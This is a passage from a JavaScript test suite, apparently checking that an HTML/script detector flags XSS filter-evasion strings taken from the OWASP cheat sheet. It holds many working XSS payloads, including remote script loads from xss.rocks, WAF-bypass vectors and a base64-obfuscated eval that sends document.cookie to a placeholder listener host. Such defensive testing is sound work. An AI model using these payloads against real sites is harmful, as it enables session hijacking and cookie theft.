        const testString3 = `<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
        const testString4 = `<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
        const testString5 = `<SCRIPT a=\`>\` SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
        const testString6 = `<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>`;
        const testString7 = `<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>`;

        const result1 = findHTMLSVGERB(testString1);
        const result2 = findHTMLSVGERB(testString2);
        const result3 = findHTMLSVGERB(testString3);
        const result4 = findHTMLSVGERB(testString4);
        const result5 = findHTMLSVGERB(testString5);
        const result6 = findHTMLSVGERB(testString6);
        const result7 = findHTMLSVGERB(testString7);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 2);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 2);

        assert.equal(result4[0], true);
        assert.equal(result4[1].length, 2);

        assert.equal(result5[0], true);
        assert.equal(result5[1].length, 2);

        assert.equal(result6[0], true);
        assert.equal(result6[1].length, 2);

        assert.equal(result7[0], true);
        assert.equal(result7[1].length, 3);
    })

    /*
    *   URL String Evasion
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#url-string-evasion
    */
    it('should match URL String Evasion', function() {
        const testString1 = `<A HREF="http://66.102.7.147/">XSS</A>`;
        const testString2 = `<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>`;
        const testString3 = `<A HREF="http://1113982867/">XSS</A>`;
        const testString4 = `<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>`;
        const testString5 = `<A HREF="http://0102.0146.0007.00000223/">XSS</A>`;
        const testString6 = `<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">`;
        const testString7 = `<A HREF="h
                            tt  p://6   6.000146.0x7.147/">XSS</A>`;
        const testString8 = `<A HREF="//www.google.com/">XSS</A>`;
        const testString9 = `<A HREF="http://google.com/">XSS</A>`;
        const testString10 = `<A HREF="http://www.google.com./">XSS</A>`;
        const testString11 = `<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`;
        const testString12 = `<A HREF="http://www.google.com/ogle.com/">XSS</A>`;            
        
        const result1 = findHTMLSVGERB(testString1);
        const result2 = findHTMLSVGERB(testString2);
        const result3 = findHTMLSVGERB(testString3);
        const result4 = findHTMLSVGERB(testString4);
        const result5 = findHTMLSVGERB(testString5);
        const result6 = findHTMLSVGERB(testString6);
        const result7 = findHTMLSVGERB(testString7);
        const result8 = findHTMLSVGERB(testString8);
        const result9 = findHTMLSVGERB(testString9);
        const result10 = findHTMLSVGERB(testString10);
        const result11 = findHTMLSVGERB(testString11);
        const result12 = findHTMLSVGERB(testString12);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 2);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 2);

        assert.equal(result4[0], true);
        assert.equal(result4[1].length, 2);

        assert.equal(result5[0], true);
        assert.equal(result5[1].length, 2);

        assert.equal(result6[0], true);
        assert.equal(result6[1].length, 1);

        assert.equal(result7[0], true);
        assert.equal(result7[1].length, 2);

        assert.equal(result8[0], true);
        assert.equal(result8[1].length, 2);

        assert.equal(result9[0], true);
        assert.equal(result9[1].length, 2);

        assert.equal(result10[0], true);
        assert.equal(result10[1].length, 2);

        assert.equal(result11[0], true);
        assert.equal(result11[1].length, 2);

        assert.equal(result12[0], true);
        assert.equal(result12[1].length, 2);
    })

    /*
    *   Assisting XSS with HTTP Parameter Pollution
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#assisting-xss-with-http-parameter-pollution
    */
    it('should match Assisting XSS with HTTP Parameter Pollution', function() {
        const testString1 = `<a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>`;
        const testString2 = `<script>
                            var contentType = <%=Request.getParameter("content_type")%>;
                            var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
                            ...
                            //some user agreement and sending to server logic might be here
                            ...
                            </script>`;
        const testString3 = `<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>`;
        const testString4 = `<script>
                            var contentType = 1; alert(1);
                            var title = "This is a regular title";
                            …
                            //some user agreement and sending to server logic might be here
                            …
                            </script>`;         

        const result1 = findHTMLSVGERB(testString1);
        const result2 = findHTMLSVGERB(testString2);
        const result3 = findHTMLSVGERB(testString3);
        const result4 = findHTMLSVGERB(testString4);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 2);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 4);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 2);

        assert.equal(result4[0], true);
        assert.equal(result4[1].length, 2);
    })

    /*
    *   WAF ByPass Strings for XSS
    *   https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#waf-bypass-strings-for-xss
    */
    it('should match WAF ByPass Strings for XSS', function() {
        const testString1 = `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`;
        const testString2 = `<Video> <source onerror = "javascript: alert (XSS)">`;
        const testString3 = `<Input value = "XSS" type = text>`;
        const testString4 = `<applet code="javascript:confirm(document.cookie);">`;   
        const testString5 = `<isindex x="javascript:" onmouseover="alert(XSS)">`;
        const testString6 = `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`;
        const testString7 = `"><img src="x:x" onerror="alert(XSS)">`;
        const testString8 = `"><iframe src="javascript:alert(XSS)">`;
        const testString9 = `<object data="javascript:alert(XSS)">`;
        const testString10 = `<isindex type=image src=1 onerror=alert(XSS)>`;
        const testString11 = `<img src=x:alert(alt) onerror=eval(src) alt=0>`;
        const testString12 = `<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>`;
        const testString13 = `<iframe/src="data:text/html,<svg onload=alert(1)>">`;
        const testString14 = `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`;
        const testString15 = `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`;
        const testString16 = `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`;
        const testString17 = `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`;
        const testString18 = `<form><a href="javascript:\u0061lert(1)">X`;
        const testString19 = `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`;
        const testString20 = `<style>//*{x:expression(alert(/xss/))}//<style></style>`;
        const testString21 = `<img src="/" =_=" title="onerror='prompt(1)'">`;
        const testString22 = `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`;
        const testString23 = `<script x> alert(1) </script 1=2`;
        const testString24 = `<form><button formaction=javascript&colon;alert(1)>CLICKME`;
        const testString25 = `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`;
        const testString26 = `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`;
        const testString27 = `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>`;      

        const result1 = findHTMLSVGERB(testString1);
        const result2 = findHTMLSVGERB(testString2);
        const result3 = findHTMLSVGERB(testString3);
        const result4 = findHTMLSVGERB(testString4);
        const result5 = findHTMLSVGERB(testString5);
        const result6 = findHTMLSVGERB(testString6);
        const result7 = findHTMLSVGERB(testString7);
        const result8 = findHTMLSVGERB(testString8);
        const result9 = findHTMLSVGERB(testString9);
        const result10 = findHTMLSVGERB(testString10);
        const result11 = findHTMLSVGERB(testString11);
        const result12 = findHTMLSVGERB(testString12);
        const result13 = findHTMLSVGERB(testString13);
        const result14 = findHTMLSVGERB(testString14);
        const result15 = findHTMLSVGERB(testString15);
        const result16 = findHTMLSVGERB(testString16);
        const result17 = findHTMLSVGERB(testString17);
        const result18 = findHTMLSVGERB(testString18);
        const result19 = findHTMLSVGERB(testString19);
        const result20 = findHTMLSVGERB(testString20);
        const result21 = findHTMLSVGERB(testString21);
        const result22 = findHTMLSVGERB(testString22);
        const result23 = findHTMLSVGERB(testString23);
        const result24 = findHTMLSVGERB(testString24);
        const result25 = findHTMLSVGERB(testString25);
        const result26 = findHTMLSVGERB(testString26);
        const result27 = findHTMLSVGERB(testString27);

        assert.equal(result1[0], true);
        assert.equal(result1[1].length, 1);

        assert.equal(result2[0], true);
        assert.equal(result2[1].length, 2);

        assert.equal(result3[0], true);
        assert.equal(result3[1].length, 1);

        assert.equal(result4[0], true);
        assert.equal(result4[1].length, 1);

        assert.equal(result5[0], true);
        assert.equal(result5[1].length, 1);

        assert.equal(result6[0], true);
        assert.equal(result6[1].length, 3);

        assert.equal(result7[0], true);
        assert.equal(result7[1].length, 1);

        assert.equal(result8[0], true);
        assert.equal(result8[1].length, 1);

        assert.equal(result9[0], true);
        assert.equal(result9[1].length, 1);

        assert.equal(result10[0], true);
        assert.equal(result10[1].length, 1);

        assert.equal(result11[0], true);
        assert.equal(result11[1].length, 1);

        assert.equal(result12[0], true);
        assert.equal(result12[1].length, 2);

        assert.equal(result13[0], true);
        assert.equal(result13[1].length, 1);

        assert.equal(result14[0], true);
        assert.equal(result14[1].length, 1);

        assert.equal(result15[0], true);
        assert.equal(result15[1].length, 3);

        assert.equal(result16[0], true);
        assert.equal(result16[1].length, 1);

        assert.equal(result17[0], true);
        assert.equal(result17[1].length, 1);

        assert.equal(result18[0], true);
        assert.equal(result18[1].length, 2);

        assert.equal(result19[0], true);
        assert.equal(result19[1].length, 2);

        assert.equal(result20[0], true);
        assert.equal(result20[1].length, 3);

        assert.equal(result21[0], true);
        assert.equal(result21[1].length, 1);

        assert.equal(result22[0], true);
        assert.equal(result22[1].length, 1);

        assert.equal(result23[0], true);
        assert.equal(result23[1].length, 2);

        assert.equal(result24[0], true);
        assert.equal(result24[1].length, 2);

        assert.equal(result25[0], true);
        assert.equal(result25[1].length, 1);

        assert.equal(result26[0], true);
        assert.equal(result26[1].length, 2);

        assert.equal(result27[0], true);
        assert.equal(result27[1].length, 3);
    })
});
